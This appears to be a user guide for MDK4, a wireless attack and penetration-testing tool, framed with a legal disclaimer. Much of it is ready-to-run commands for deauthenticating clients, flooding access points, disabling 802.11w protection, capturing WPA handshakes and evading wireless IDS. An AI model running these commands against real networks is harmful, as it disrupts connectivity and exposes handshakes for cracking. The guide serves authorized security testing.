# MDK4 Complete User Guide

## Table of Contents
1. [Introduction](#introduction)
2. [Installation](#installation)
3. [Basic Syntax](#basic-syntax)
4. [Attack Modes Overview](#attack-modes-overview)
5. [Detailed Attack Mode Guide](#detailed-attack-mode-guide)
6. [Common Options](#common-options)
7. [Practical Examples](#practical-examples)
8. [Legal Disclaimer](#legal-disclaimer)
9. [Troubleshooting](#troubleshooting)

---

## Introduction

**MDK4** (Murder Death Kill 4) is a powerful wireless security testing tool designed for IEEE 802.11 protocol vulnerability assessment and penetration testing. It is the successor to MDK3 and provides enhanced capabilities for testing wireless network security.

### Key Features
- **Modular Design**: 9 different attack modes for comprehensive testing
- **Dual-Band Support**: Works with both 2.4GHz and 5GHz networks
- **Dual Interface Support**: Can use one interface for receiving and another for injecting
- **IDS Evasion**: Supports ghosting and fragmenting techniques
- **Cross-Platform**: Works on Linux, macOS, and other Unix-like systems
- **Based on Aircrack-ng**: Uses the osdep library from aircrack-ng for frame injection

### What MDK4 is Used For
- Penetration testing of wireless networks
- Testing wireless IDS/IPS systems
- Demonstrating wireless vulnerabilities
- Security research and education
- Network hardening assessments

---

## Installation

### Prerequisites
```bash
# Install required dependencies
sudo apt-get update
sudo apt-get install pkg-config libnl-3-dev libnl-genl-3-dev libpcap-dev build-essential
```

### Installing MDK4
```bash
# Clone the repository
git clone https://github.com/aircrack-ng/mdk4

# Navigate to directory
cd mdk4

# Compile
make

# Install system-wide
sudo make install
```

### Verify Installation
```bash
mdk4 --help
```

---

## Basic Syntax

### Command Structure
```bash
mdk4 <interface> <attack_mode> [attack_options]
```

### Dual Interface Mode
```bash
mdk4 <interface_in> <interface_out> <attack_mode> [attack_options]
```

### Getting Help
```bash
# General help
mdk4 --help

# Full help with all options
mdk4 --fullhelp

# Help for specific attack mode
mdk4 --help <attack_mode>
```

### Preparing Your Wireless Interface
```bash
# Check wireless interfaces
iwconfig

# Put interface in monitor mode
sudo airmon-ng start wlan0

# Your interface will typically become wlan0mon or mon0
```

---

## Attack Modes Overview

MDK4 has **9 attack modes**, each designated by a single letter:

| Mode | Name | Description |
|------|------|-------------|
| **b** | Beacon Flooding | Sends beacon frames to show fake APs |
| **a** | Authentication DoS | Sends authentication frames to all APs |
| **d** | Deauthentication/Disassociation | Disconnects clients from APs |
| **p** | SSID Probing | Probes APs and bruteforces hidden SSIDs |
| **e** | EAPOL Start/Logoff | Floods AP with EAPOL frames |
| **s** | Mesh Networks | Attacks IEEE 802.11s mesh networks |
| **w** | WIDS Confusion | Confuses Wireless IDS/IPS systems |
| **f** | Packet Fuzzer | Fuzzes packets to test implementations |
| **x** | PoC Testing | Tests for WiFi protocol vulnerabilities |

---

## Detailed Attack Mode Guide

### Mode b - Beacon Flooding

**Purpose**: Creates multiple fake access points to confuse clients and network scanners.

**How it Works**: Sends beacon frames that make fake APs appear in WiFi scans. Can crash network scanners and some drivers.

**Basic Usage**:
```bash
mdk4 wlan0mon b
```

**Common Options**:
```bash
-n <SSID>          # Use SSID from file (one per line)
-f <filename>      # Read SSIDs from file
-v <filename>      # Read SSIDs and create specific APs (advanced)
-t <filename>      # Read SSIDs from file and create WPA/WPA2 APs
-a                 # Use all possible characters in SSIDs
-m                 # Use valid MAC addresses from OUI database
-c <channel>       # Create APs on specific channel (default: random)
-s <pps>           # Set speed in packets per second (default: 50)
-h                 # Hop to channel where AP is spoofed
-w <encryptions>   # Specify encryption: n=None, w=WEP, t=TKIP, a=AES
```

**Examples**:
```bash
# Create random fake APs
mdk4 wlan0mon b -s 100

# Create fake APs from wordlist
mdk4 wlan0mon b -f ssid_list.txt -s 200

# Create WPA2 fake APs on channel 6
mdk4 wlan0mon b -f ssids.txt -c 6 -w a

# Create fake APs with valid MAC addresses
mdk4 wlan0mon b -m -s 150
```

**Use Cases**:
- Testing how network monitoring tools handle large numbers of APs
- Demonstrating security awareness
- Testing WiFi scanner applications
- Hiding legitimate networks in noise

---

### Mode a - Authentication DoS

**Purpose**: Floods access points with authentication requests to consume resources.

**How it Works**: Sends continuous authentication frames to all detected APs, exhausting their resources and potentially causing denial of service.

**Basic Usage**:
```bash
mdk4 wlan0mon a
```

**Common Options**:
```bash
-a <BSSID>         # Target specific AP by MAC address
-m                 # Use valid MAC addresses from OUI database
-i <filename>      # Read target MAC addresses from file
-s <pps>           # Set speed in packets per second
```

**Examples**:
```bash
# Attack all APs in range
mdk4 wlan0mon a -s 100

# Attack specific AP
mdk4 wlan0mon a -a 00:11:22:33:44:55

# Attack APs from file
mdk4 wlan0mon a -i targets.txt -s 200
```

**Use Cases**:
- Testing AP resilience against authentication floods
- Evaluating rate limiting implementations
- Testing failover mechanisms

---

### Mode d - Deauthentication/Disassociation

**Purpose**: Disconnect clients from access points.

**How it Works**: Sends deauthentication and disassociation packets to clients, forcing them to disconnect from the AP. Works by monitoring data traffic and targeting active connections.

**Basic Usage**:
```bash
mdk4 wlan0mon d
```

**Common Options**:
```bash
-w <filename>      # Whitelist of MAC addresses (BSSID, Client) to NOT attack
-b <filename>      # Blacklist of MAC addresses to specifically attack
-s <pps>           # Set speed in packets per second
-c <channel>       # Focus on specific channel
-E <ESSID>         # Target specific network by name
-B <BSSID>         # Target specific AP by MAC address
-S <MAC>           # Target specific client station
-W                 # Disable 802.11w protection features
```

**Examples**:
```bash
# Deauth all clients on all APs
mdk4 wlan0mon d

# Deauth clients on specific AP
mdk4 wlan0mon d -B 00:11:22:33:44:55

# Deauth clients on specific network name
mdk4 wlan0mon d -E "TargetNetwork"

# Deauth specific client from any AP
mdk4 wlan0mon d -S AA:BB:CC:DD:EE:FF

# Deauth with whitelist (protect certain devices)
mdk4 wlan0mon d -w whitelist.txt

# Deauth on specific channel at high speed
mdk4 wlan0mon d -c 6 -s 100
```

**File Format for Whitelist/Blacklist**:
```
# Format: One MAC address per line
00:11:22:33:44:55
AA:BB:CC:DD:EE:FF
```

**Use Cases**:
- Testing client reconnection behavior
- Capturing WPA handshakes for auditing
- Testing 802.11w (Management Frame Protection)
- Evaluating network resilience

---

### Mode p - SSID Probing

**Purpose**: Probe for hidden SSIDs and test AP responses.

**How it Works**: Sends probe requests to discover hidden networks and test if APs are in range. Can bruteforce hidden SSIDs using wordlists.

**Basic Usage**:
```bash
mdk4 wlan0mon p
```

**Common Options**:
```bash
-e <SSID>          # Target specific SSID
-f <filename>      # Read SSIDs from file for bruteforcing
-t <MAC>           # Target specific AP by BSSID
-s <pps>           # Set speed in packets per second
-b <character_set> # Use custom character set for bruteforce
```

**Examples**:
```bash
# Probe for hidden networks with wordlist
mdk4 wlan0mon p -f common_ssids.txt

# Probe specific AP
mdk4 wlan0mon p -t 00:11:22:33:44:55

# Test if specific SSID exists
mdk4 wlan0mon p -e "HiddenNetwork"

# High-speed probing
mdk4 wlan0mon p -f wordlist.txt -s 300
```

**Use Cases**:
- Discovering hidden networks
- Testing probe request handling
- Verifying SSID cloaking implementations
- Network reconnaissance

---

### Mode e - EAPOL Start/Logoff Packet Injection

**Purpose**: Attack WPA/WPA2 authentication process.

**How it Works**: Floods APs with EAPOL Start frames to exhaust resources, or sends EAPOL Logoff messages to disconnect authenticated clients.

**Basic Usage**:
```bash
mdk4 wlan0mon e
```

**Common Options**:
```bash
-t <BSSID>         # Target specific AP
-s <pps>           # Set packet speed
-l                 # Use EAPOL Logoff instead of Start
```

**Examples**:
```bash
# Flood AP with EAPOL Start frames
mdk4 wlan0mon e -t 00:11:22:33:44:55

# Send EAPOL Logoff to disconnect clients
mdk4 wlan0mon e -t 00:11:22:33:44:55 -l

# High-speed EAPOL flood
mdk4 wlan0mon e -s 200
```

**Use Cases**:
- Testing WPA/WPA2 authentication resilience
- Evaluating rate limiting
- Testing EAPOL handling

---

### Mode s - Mesh Network Attacks

**Purpose**: Attack IEEE 802.11s mesh networks.

**How it Works**: Exploits mesh network protocols by flooding neighbors and routes, creating black holes, or diverting traffic.

**Basic Usage**:
```bash
mdk4 wlan0mon s
```

**Common Options**:
```bash
-f <type>          # Attack type: n=neighbor flooding, r=route flooding
-b <BSSID>         # Target specific mesh node
```

**Examples**:
```bash
# Flood mesh neighbors
mdk4 wlan0mon s -f n

# Flood mesh routes
mdk4 wlan0mon s -f r

# Target specific mesh node
mdk4 wlan0mon s -b 00:11:22:33:44:55
```

**Use Cases**:
- Testing mesh network security
- Evaluating routing protocol resilience
- Research on mesh vulnerabilities

---

### Mode w - WIDS/WIPS Confusion

**Purpose**: Confuse and abuse Wireless Intrusion Detection/Prevention Systems.

**How it Works**: Cross-connects clients to multiple WDS nodes or creates fake rogue APs to trigger false positives in security systems.

**Basic Usage**:
```bash
mdk4 wlan0mon w
```

**Common Options**:
```bash
-z                 # Activate Zero_Chaos' WIDS exploit
```

**Examples**:
```bash
# Confuse WIDS systems
mdk4 wlan0mon w

# Use WIDS exploit
mdk4 wlan0mon w -z
```

**Use Cases**:
- Testing WIDS/WIPS effectiveness
- Evaluating false positive rates
- Security system validation

---

### Mode f - Packet Fuzzer

**Purpose**: Test WiFi implementations with malformed packets.

**How it Works**: Creates and injects fuzzy/malformed packets to test how devices handle invalid or unexpected data.

**Basic Usage**:
```bash
mdk4 wlan0mon f
```

**Common Options**:
```bash
-s <pps>           # Set packet speed
-t <BSSID>         # Target specific MAC
-m <mode>          # Fuzzing mode
```

**Examples**:
```bash
# Basic fuzzing
mdk4 wlan0mon f

# Fuzz specific target
mdk4 wlan0mon f -t 00:11:22:33:44:55

# High-speed fuzzing
mdk4 wlan0mon f -s 500
```

**Use Cases**:
- Finding implementation bugs
- Testing driver stability
- Security research
- Vulnerability discovery

---

### Mode x - PoC WiFi Protocol Vulnerabilities

**Purpose**: Test for known WiFi protocol implementation vulnerabilities.

**How it Works**: Executes proof-of-concept attacks for various WiFi vulnerabilities to test if devices are affected.

**Basic Usage**:
```bash
mdk4 wlan0mon x
```

**Examples**:
```bash
# Run vulnerability tests
mdk4 wlan0mon x
```

**Use Cases**:
- Testing for known CVEs
- Vulnerability assessment
- Patch verification
- Security auditing

---

## Common Options

### General Options (Available for Most Modes)

```bash
-h                 # Show help for specific mode
-c <channel>       # Set specific channel (1-14 for 2.4GHz, 36+ for 5GHz)
-s <pps>           # Packets per second (speed)
-m                 # Use valid MAC addresses from IEEE OUI database
-v                 # Verbose mode (show more details)
```

### Advanced Options

```bash
-g                 # Enable ghosting (IDS evasion)
-p                 # Enable fragmenting (IDS evasion)
```

---

## Practical Examples

### Example 1: Capture WPA Handshake
```bash
# Terminal 1: Deauth to force handshake
mdk4 wlan0mon d -E "TargetNetwork" -c 6

# Terminal 2: Capture with airodump-ng
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon
```

### Example 2: Test Network Scanner
```bash
# Create 100 fake APs to test scanner performance
mdk4 wlan0mon b -s 100 -m
```

### Example 3: Test WIDS System
```bash
# Generate activity to test WIDS detection
mdk4 wlan0mon w
```

### Example 4: Discover Hidden Network
```bash
# Create wordlist
cat > ssids.txt << EOF
HiddenNetwork
SecretWiFi
GuestNetwork
EOF

# Probe for hidden SSIDs
mdk4 wlan0mon p -f ssids.txt
```

### Example 5: Test 802.11w Protection
```bash
# Try to deauth clients (should fail if 802.11w enabled)
mdk4 wlan0mon d -B 00:11:22:33:44:55

# Disable 802.11w protection in attack
mdk4 wlan0mon d -B 00:11:22:33:44:55 -W
```

### Example 6: Channel Hopping Beacon Flood
```bash
# Create fake APs that hop channels
mdk4 wlan0mon b -h -f ssids.txt
```

### Example 7: Targeted Client Disconnection
```bash
# Disconnect only specific client
mdk4 wlan0mon d -S AA:BB:CC:DD:EE:FF -B 00:11:22:33:44:55
```

---

## Legal Disclaimer

⚠️ **IMPORTANT LEGAL NOTICE** ⚠️

### Authorization Required
MDK4 is a powerful tool that can disrupt wireless networks. **You MUST have explicit written permission** from the network owner before conducting any tests.

### Legal Consequences
Unauthorized use of MDK4 can result in:
- **Criminal charges** under Computer Fraud and Abuse Act (CFAA) or equivalent laws
- **Heavy fines** (potentially hundreds of thousands of dollars)
- **Imprisonment** (up to 10+ years depending on jurisdiction)
- **Civil lawsuits** for damages
- **Loss of security certifications**

### Acceptable Use
MDK4 should ONLY be used for:
- ✅ Testing YOUR OWN networks
- ✅ Authorized penetration testing engagements (with written contracts)
- ✅ Security research in controlled lab environments
- ✅ Educational purposes on isolated test networks
- ✅ CTF (Capture The Flag) competitions
- ✅ Professional security assessments with proper authorization

### Unacceptable Use
- ❌ Attacking networks without permission
- ❌ Disrupting public WiFi
- ❌ Interfering with business operations
- ❌ Attacking infrastructure (airports, hospitals, etc.)
- ❌ "Testing" neighbor's WiFi
- ❌ Any malicious or harmful activities

### Best Practices
1. **Get Written Permission**: Always obtain signed authorization before testing
2. **Define Scope**: Clearly document what networks and times are authorized
3. **Document Everything**: Keep detailed logs of all testing activities
4. **Use Isolated Environments**: Test on dedicated equipment when possible
5. **Follow Responsible Disclosure**: Report vulnerabilities properly
6. **Stay Updated on Laws**: Wireless laws vary by country and region

### Disclaimer
The authors and distributors of MDK4 are not responsible for any misuse of this tool. **You are solely responsible** for your actions and any consequences.

---

## Troubleshooting

### Issue: "No wireless extensions" or interface not found
**Solution**:
```bash
# Check if interface exists
iwconfig

# Make sure interface is in monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

### Issue: Packets not being injected
**Solution**:
```bash
# Test injection capability
sudo aireplay-ng --test wlan0mon

# Some chipsets don't support injection
# Check if your adapter supports injection: https://www.aircrack-ng.org/doku.php?id=compatibility_drivers
```

### Issue: Operation not permitted
**Solution**:
```bash
# Run with sudo
sudo mdk4 wlan0mon d
```

### Issue: Channel hopping not working
**Solution**:
```bash
# Stop processes that might interfere
sudo airmon-ng check kill

# Manually set channel if needed
sudo iwconfig wlan0mon channel 6
```

### Issue: Low packet injection rate
**Solution**:
```bash
# Increase packet speed
mdk4 wlan0mon b -s 200

# Check CPU usage - may be hardware limited
# Use better wireless adapter with higher injection rates
```

### Issue: WIDS detecting attacks immediately
**Solution**:
```bash
# Use IDS evasion techniques
mdk4 wlan0mon d -g      # Enable ghosting
mdk4 wlan0mon d -p      # Enable fragmenting
mdk4 wlan0mon d -g -p   # Use both
```

### Recommended Wireless Adapters for MDK4
- **Alfa AWUS036ACH** (Dual-band, excellent injection)
- **Alfa AWUS036NHA** (2.4GHz, reliable)
- **TP-Link TL-WN722N v1** (Budget option, 2.4GHz only)
- **Panda PAU09** (Good compatibility)
- **Alfa AWUS1900** (High power, dual-band)

**Note**: v2 and later versions of some adapters (like TL-WN722N) may NOT support injection. Always verify chipset.

---

## Additional Resources

### Official Documentation
- GitHub Repository: https://github.com/aircrack-ng/mdk4
- Aircrack-ng Suite: https://www.aircrack-ng.org/

### Related Tools
- **Aircrack-ng**: WiFi security auditing suite
- **Airodump-ng**: Packet capture and analysis
- **Aireplay-ng**: Packet injection
- **Wireshark**: Network protocol analyzer
- **Kismet**: Wireless network detector

### Learning Resources
- Kali Linux Tools Documentation
- WiFi pentesting courses
- OSWP (Offensive Security Wireless Professional) certification
- Wireless security research papers

### Chipset Information
Check if your wireless adapter supports injection:
- https://www.aircrack-ng.org/doku.php?id=compatibility_drivers

---

## Quick Reference Card

```
ATTACK MODES:
b - Beacon Flooding          Create fake APs
a - Authentication DoS       Flood with auth requests
d - Deauthentication        Disconnect clients
p - SSID Probing            Find hidden networks
e - EAPOL                   Attack WPA auth
s - Mesh Networks           Attack 802.11s mesh
w - WIDS Confusion          Confuse IDS/IPS
f - Packet Fuzzer           Fuzz packets
x - PoC Testing             Test vulnerabilities

COMMON OPTIONS:
-c <channel>                Set channel
-s <pps>                    Set speed
-m                          Use valid MACs
-h                          Mode-specific help

ESSENTIAL COMMANDS:
airmon-ng start wlan0       Enable monitor mode
iwconfig                    Check interfaces
mdk4 --help <mode>          Get mode help
mdk4 --fullhelp             Full help
```

---

## Conclusion

MDK4 is an essential tool for wireless security professionals, offering comprehensive capabilities for testing WiFi networks. Always use it responsibly and legally.

**Remember**:
- Always get authorization
- Document your testing
- Follow ethical guidelines
- Use for defensive purposes
- Stay within the law

---

**Document Version**: 1.0
**Last Updated**: November 2025
**MDK4 Version**: 4.x
**Author**: Comprehensive User Guide

---

*This guide is for educational and authorized security testing purposes only.*
